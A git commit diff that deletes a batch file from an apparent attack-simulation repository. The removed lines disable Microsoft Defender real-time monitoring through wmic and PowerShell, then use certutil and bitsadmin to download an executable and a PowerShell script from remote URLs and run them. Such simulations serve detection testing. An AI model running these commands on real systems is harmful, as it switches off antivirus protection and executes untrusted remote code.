a6ce52a16db8a5709ad40f193eddd8ab9aa1bd6c
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2024-10-15 22:48:50 +0900

    Delete DEV/SimulationRepo/dev6.bat

--- DEV/SimulationRepo/dev6.bat
+++
@@ -1,7 +0,0 @@
-wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
-timeout /t 10 /nobreak >nul
-certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
-cmd /c "%Temp%\validatecloud.exe"
-timeout /t 10 /nobreak >nul
-bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.ps1 %temp%\dev7.ps1
-cmd /c "%Temp%\dev7.ps1"
